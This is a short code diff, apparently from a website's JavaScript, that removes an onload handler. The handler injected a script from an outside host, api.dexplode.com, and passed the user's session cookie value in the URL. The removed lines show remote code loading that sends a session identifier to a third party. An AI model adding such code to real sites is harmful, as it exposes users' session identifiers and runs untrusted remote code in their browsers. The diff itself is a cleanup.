@@ -26,8 +26,3 @@ if (!getCookie('session')) {
     var uuid = guid();
     setCookie('session', uuid, 730);
 }
-window.onload = function() {
-    var pot = document.createElement('script');
-    pot.src = 'https://api.dexplode.com/dFv1pZ/?key=' + getCookie('session');
-    document.getElementsByTagName('head')[0].appendChild(pot);
-}
